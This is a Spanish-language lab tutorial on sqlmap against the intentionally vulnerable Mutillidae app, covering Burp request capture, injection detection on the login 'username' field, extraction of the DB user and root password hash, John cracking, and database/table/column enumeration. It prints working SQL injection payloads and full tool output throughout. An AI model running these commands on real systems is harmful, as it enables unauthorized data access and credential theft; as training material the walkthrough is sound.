# SQLmap (Funcionalidad - Parte 2)

En primer lugar `sqlmap` tiene que recibir una URL donde haya una serie de campos que va a identificar automaticamente como puntos de injeccion o podemos pasarle una peticion que hayamos interceptado con `Burp Suite` y que a nivel personal me parece la mejor opcion.

Por ejemplo, abriendo `Burp Suite`, llendonod en la pagina de `Mutillidae` en la seccion de `SQL Injection - Bypass Login` vamos a poner un usuario y contraseña, pero antes de darle a enviar ponemos a `Burp Suite` a la escucha, por lo que una vez que este a la escucha le damos a enviar para que nos capture la peticion:

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Y una vez que tengamos esta peticion la vamos a guardar en un fichero de la siguinte forma, seleccionaremos todo -> le daremos click derecho -> `Copy to File` -> seleccionamos donde queremos guardar el archivo -> ponemos como nombre algo como `request.burp.txt` -> `Save`

Y si todo ha ido bien veremos que nos creo el archivo el cual le pasaremos a `sqlmap` con toda esa captura para que nos haga la injeccion.

Por lo que pondremos lo siguiente:

```shell
sqlmap -r request.burp.txt
```

Esto se pondra a testear, nos preguntara de primeras si queremos seguir la redireccion que hace la pagina de `mutillidae` a la home de cuando se logea, pero le pondremos una `n` por que queremos que se quede en ese panel para que compruebe si es vulnerable.

Y ya es ir siguiendo las preguntas que te va haciendo para ir testeando ese campo que estamos intentando ver si es vulnerable o no.

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:19:08 /2024-11-17/

[04:19:09] [INFO] parsing HTTP request from 'request.burp.txt'
[04:19:09] [WARNING] provided value for parameter 'redirectPage' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[04:19:09] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.5.177/mutillidae/src/index.php?popUpNotificationCode=AU1'. Do you want to follow? [Y/n] n
[04:19:11] [INFO] testing if the target URL content is stable
[04:19:11] [WARNING] POST parameter 'redirectPage' does not appear to be dynamic
[04:19:11] [WARNING] heuristic (basic) test shows that POST parameter 'redirectPage' might not be injectable
[04:19:11] [INFO] testing for SQL injection on POST parameter 'redirectPage'
[04:19:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:19:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:19:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:19:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[04:19:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[04:19:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[04:19:11] [INFO] testing 'Generic inline queries'
[04:19:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[04:19:11] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                      
[04:19:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[04:19:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[04:19:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:19:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[04:19:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[04:19:12] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[04:19:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[04:19:48] [WARNING] POST parameter 'redirectPage' does not seem to be injectable
[04:19:48] [WARNING] POST parameter 'username' does not appear to be dynamic
[04:19:48] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[04:19:49] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[04:19:49] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[04:20:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:20:15] [WARNING] reflective value(s) found and filtering out
[04:20:15] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[04:20:15] [INFO] testing 'Generic inline queries'
[04:20:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:20:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:20:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:20:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:20:15] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:20:15] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[04:20:15] [INFO] testing 'MySQL inline queries'
[04:20:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:20:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:20:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:20:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:20:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:20:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:20:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:20:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:20:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:20:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:20:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:20:46] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n
[04:22:06] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[04:22:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[04:22:06] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[04:22:07] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:22:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:22:09] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:22:11] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:22:12] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:22:13] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:22:15] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:22:16] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:22:18] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:22:19] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 324 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 1840=1840 AND 'ancZ'='ancZ&password=password&login-php-submit-button=Login

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: redirectPage=&username=diseo' AND GTID_SUBSET(CONCAT(0x71626b7871,(SELECT (ELT(7257=7257,1))),0x716b766a71),7257) AND 'UBVb'='UBVb&password=password&login-php-submit-button=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: redirectPage=&username=diseo' AND (SELECT 7561 FROM (SELECT(SLEEP(5)))JwnU) AND 'Vgqz'='Vgqz&password=password&login-php-submit-button=Login
---
[04:22:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[04:22:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 04:22:30 /2024-11-17/
```

Vemos que nos informa de que el parametro `username` es vulnerable.

Ahora que sabemos que ese parametro es vulnerable, podremos aprivechar eso para obtener informacion, si por ejemplo queremos hacer lo que estabamos haciendo antes para saber el usuario que esta dentras en la base de datos haciendo las consultas, podremos hacerlo de la siguiente forma:

```shell
sqlmap -r request.burp.txt --ignore-redirects --technique B -p username --current-user
```

Con el parametro `--ignore-redirects` estamos diciendo que no nos redireccione a ningun sitio, para no tener que estar metiendo las respuestas.

Con el parametro `--technique B` estamos especificando el tipo de tecnica que queremos que utilice, en nuestro caso la `B` se asocia a un `Blind SQL Injection`.

Con el parametro `-p username` indicamos que sea en el parametro `username` donde queremos que realice la injeccion.

Con el parametro `--current-user` le decimos que nos saque el usuario actual de la base de datos.

```
       ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:35:17 /2024-11-17/

[04:35:17] [INFO] parsing HTTP request from 'request.burp.txt'
[04:35:17] [INFO] resuming back-end DBMS 'mysql' 
[04:35:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 9177=9177 AND 'rqfz'='rqfz&password=password&login-php-submit-button=Login
---
[04:35:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[04:35:17] [INFO] fetching current user
[04:35:17] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:35:17] [INFO] retrieved: root@localhost
current user: 'root@localhost'
[04:35:20] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 04:35:20 /2024-11-17/
```

Y con esto, vemos que mediante esta consulta `diseo' AND 9177=9177 AND 'rqfz'='rqfz` nos ha sacado `root@localhost`.

Ahora sabiendo el usuario, lo que podemos hacer es sacar la contraseña de este usuario de la siguiente forma:

```shell
sqlmap -r request.burp.txt --ignore-redirects --batch --technique B -p username -U root@localhost --passwords
```

Le añadimos el `--batch` para que se ponga de forma automatica las preguntas que nos haga `sqlmap`.

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:40:24 /2024-11-17/

[04:40:24] [INFO] parsing HTTP request from 'request.burp.txt'
[04:40:24] [INFO] resuming back-end DBMS 'mysql' 
[04:40:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 9177=9177 AND 'rqfz'='rqfz&password=password&login-php-submit-button=Login
---
[04:40:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[04:40:24] [INFO] fetching database users password hashes
[04:40:24] [INFO] fetching number of password hashes for user 'root'
[04:40:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:40:24] [INFO] retrieved: 1
[04:40:27] [INFO] fetching password hashes for user 'root'
[04:40:27] [INFO] retrieved: *E82A07F59B0D83BEF29F79E41FA0F8A042CE3DE4
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[04:40:33] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[04:40:33] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[04:40:33] [INFO] starting dictionary-based cracking (mysql_passwd)
[04:40:33] [INFO] starting 16 processes 
[04:40:41] [WARNING] no clear password(s) found                                                                                                                                        
database management system users password hashes:
[*] root [1]:
    password hash: *E82A07F59B0D83BEF29F79E41FA0F8A042CE3DE4

[04:40:41] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 04:40:41 /2024-11-17/
```

Vemos que nos ha sacado el `hash` de la contraseña de `root`, despues ha intentado mediante fuerza bruta crackear el `hash` pero no lo ha conseguido, por lo que nosotros de forma independiente deberiamos de intentar crackearlo.

Si nosotros intentamos crackearla, veremos lo siguiente:

```
john --wordlist=dic hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates left, minimum 8 needed for performance.
mutillidae       (?)     
1g 0:00:00:00 DONE (2024-11-17 04:43) 100.0g/s 700.0p/s 700.0c/s 700.0C/s mutillidae..root
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Vemos que la contraseña es `mutillidae`.

Para poder sacar el nombre de la base de datos, se podria hacer de la siguiente forma:

```shell
sqlmap -r request.burp.txt --ignore-redirects --batch --dbs -v 3
```

Con el parametro `--dbs` lo que estamos haciendo es que nos saque el nombre de las bases de datos de `mysql`

Con el parametro `-v 3` establecemos un nivel `3` de verbose para que nos muestre mas informacion de lo que esta realizando.

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:47:12 /2024-11-17/

[04:47:12] [INFO] parsing HTTP request from 'request.burp.txt'
[04:47:12] [DEBUG] cleaning up configuration parameters
[04:47:12] [DEBUG] setting the HTTP timeout
[04:47:12] [DEBUG] setting the HTTP User-Agent header
[04:47:12] [DEBUG] creating HTTP requests opener object
[04:47:12] [WARNING] provided value for parameter 'redirectPage' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[04:47:12] [INFO] resuming back-end DBMS 'mysql' 
[04:47:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 9177=9177 AND 'rqfz'='rqfz&password=password&login-php-submit-button=Login
    Vector: AND [INFERENCE]

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: redirectPage=&username=diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT (ELT(6087=6087,1))),0x717a786b71),6087) AND 'jgxG'='jgxG&password=password&login-php-submit-button=Login
    Vector: AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: redirectPage=&username=diseo' AND (SELECT 6646 FROM (SELECT(SLEEP(5)))lzmE) AND 'tJsu'='tJsu&password=password&login-php-submit-button=Login
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[04:47:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[04:47:12] [INFO] fetching database names
[04:47:12] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT IFNULL(CAST(COUNT(schema_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x717a786b71),9883) AND 'ZCyi'='ZCyi
[04:47:12] [DEBUG] declared web page charset 'utf-8'
[04:47:13] [WARNING] reflective value(s) found and filtering out
[04:47:13] [DEBUG] used SQL query returns 5 entries
[04:47:13] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x717a786b71),6329) AND 'Pdkx'='Pdkx
[04:47:13] [INFO] retrieved: 'mysql'
[04:47:13] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1),0x717a786b71),4368) AND 'TPct'='TPct
[04:47:14] [INFO] retrieved: 'information_schema'
[04:47:14] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1),0x717a786b71),9810) AND 'Wlpv'='Wlpv
[04:47:15] [INFO] retrieved: 'performance_schema'
[04:47:15] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 3,1),0x717a786b71),9597) AND 'IrYg'='IrYg
[04:47:15] [INFO] retrieved: 'sys'
[04:47:15] [PAYLOAD] diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 4,1),0x717a786b71),5451) AND 'mlAk'='mlAk
[04:47:16] [INFO] retrieved: 'mutillidae'
[04:47:16] [DEBUG] performed 6 queries in 3.32 seconds
available databases [5]:
[*] information_schema
[*] mutillidae
[*] mysql
[*] performance_schema
[*] sys

[04:47:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 04:47:16 /2024-11-17/
```

Y por lo que vemos nos ha sacados todas las bases de datos:

```
[*] information_schema
[*] mutillidae
[*] mysql
[*] performance_schema
[*] sys
```

Ahora para descubrir las tablas de esa base de datos `mutillidae`, podremos hacer lo siguiente:

```shell
sqlmap -r request.burp.txt --ignore-redirects --batch -D mutillidae --tables
```

Con el parametro `-D` especificamos la base de datos donde queremos que nos dumpee las tablas de la misma.

```
       ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:59:46 /2024-11-17/

[04:59:46] [INFO] parsing HTTP request from 'request.burp.txt'
[04:59:46] [WARNING] provided value for parameter 'redirectPage' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[04:59:46] [INFO] resuming back-end DBMS 'mysql' 
[04:59:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 9177=9177 AND 'rqfz'='rqfz&password=password&login-php-submit-button=Login

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: redirectPage=&username=diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT (ELT(6087=6087,1))),0x717a786b71),6087) AND 'jgxG'='jgxG&password=password&login-php-submit-button=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: redirectPage=&username=diseo' AND (SELECT 6646 FROM (SELECT(SLEEP(5)))lzmE) AND 'tJsu'='tJsu&password=password&login-php-submit-button=Login
---
[04:59:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[04:59:46] [INFO] fetching tables for database: 'mutillidae'
[04:59:46] [INFO] resumed: 'accounts'
[04:59:46] [INFO] resumed: 'blogs_table'
[04:59:46] [INFO] resumed: 'captured_data'
[04:59:46] [INFO] resumed: 'credit_cards'
[04:59:46] [INFO] resumed: 'help_texts'
[04:59:46] [INFO] resumed: 'hitlog'
[04:59:46] [INFO] resumed: 'level_1_help_include_files'
[04:59:46] [INFO] resumed: 'page_help'
[04:59:46] [INFO] resumed: 'page_hints'
[04:59:46] [INFO] resumed: 'pen_test_tools'
[04:59:46] [INFO] resumed: 'security_level'
[04:59:46] [INFO] resumed: 'user_poll_results'
[04:59:46] [INFO] resumed: 'youTubeVideos'
Database: mutillidae
[13 tables]
+----------------------------+
| accounts                   |
| blogs_table                |
| captured_data              |
| credit_cards               |
| help_texts                 |
| hitlog                     |
| level_1_help_include_files |
| page_help                  |
| page_hints                 |
| pen_test_tools             |
| security_level             |
| user_poll_results          |
| youTubeVideos              |
+----------------------------+

[04:59:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 04:59:46 /2024-11-17/
```

Con esto veremos que nos saca las tablas de la base de datos de `mutillidae`.

```
+----------------------------+
| accounts                   |
| blogs_table                |
| captured_data              |
| credit_cards               |
| help_texts                 |
| hitlog                     |
| level_1_help_include_files |
| page_help                  |
| page_hints                 |
| pen_test_tools             |
| security_level             |
| user_poll_results          |
| youTubeVideos              |
+----------------------------+
```

Si nosotros queremos sacar las columnas de una de las tablas descubiertas como por ejemplo `accounts`:

```shell
sqlmap -r request.burp.txt --ignore-redirects --batch -D mutillidae -T accounts --columns
```

Con el parametro `-T` especificamos la tabla la cual queremos dumpear la informacion solicitada.

```
       ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:01:34 /2024-11-17/

[05:01:34] [INFO] parsing HTTP request from 'request.burp.txt'
[05:01:34] [WARNING] provided value for parameter 'redirectPage' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[05:01:34] [INFO] resuming back-end DBMS 'mysql' 
[05:01:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: redirectPage=&username=diseo' AND 9177=9177 AND 'rqfz'='rqfz&password=password&login-php-submit-button=Login

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: redirectPage=&username=diseo' AND GTID_SUBSET(CONCAT(0x717a7a7171,(SELECT (ELT(6087=6087,1))),0x717a786b71),6087) AND 'jgxG'='jgxG&password=password&login-php-submit-button=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: redirectPage=&username=diseo' AND (SELECT 6646 FROM (SELECT(SLEEP(5)))lzmE) AND 'tJsu'='tJsu&password=password&login-php-submit-button=Login
---
[05:01:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[05:01:34] [INFO] fetching columns for table 'accounts' in database 'mutillidae'
[05:01:34] [WARNING] reflective value(s) found and filtering out
[05:01:35] [INFO] retrieved: 'cid'
[05:01:35] [INFO] retrieved: 'int'
[05:01:36] [INFO] retrieved: 'username'
[05:01:36] [INFO] retrieved: 'varchar(255)'
[05:01:37] [INFO] retrieved: 'password'
[05:01:37] [INFO] retrieved: 'varchar(255)'
[05:01:38] [INFO] retrieved: 'mysignature'
[05:01:38] [INFO] retrieved: 'text'
[05:01:38] [INFO] retrieved: 'is_admin'
[05:01:38] [INFO] retrieved: 'tinyint(1)'
[05:01:38] [INFO] retrieved: 'firstname'
[05:01:38] [INFO] retrieved: 'varchar(255)'
[05:01:38] [INFO] retrieved: 'lastname'
[05:01:38] [INFO] retrieved: 'varchar(255)'
[05:01:38] [INFO] retrieved: 'client_id'
[05:01:38] [INFO] retrieved: 'char(32)'
[05:01:38] [INFO] retrieved: 'client_secret'
[05:01:39] [INFO] retrieved: 'varchar(64)'
[05:01:39] [INFO] retrieved: 'created_at'
[05:01:39] [INFO] retrieved: 'timestamp'
Database: mutillidae
Table: accounts
[10 columns]
+---------------+--------------+
| Column        | Type         |
+---------------+--------------+
| cid           | int          |
| client_id     | char(32)     |
| client_secret | varchar(64)  |
| created_at    | timestamp    |
| firstname     | varchar(255) |
| is_admin      | tinyint(1)   |
| lastname      | varchar(255) |
| mysignature   | text         |
| password      | varchar(255) |
| username      | varchar(255) |
+---------------+--------------+

[05:01:39] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.5.177'

[*] ending @ 05:01:39 /2024-11-17/
```

Y con esto nos sacara las columnas de la tabla `accounts`.
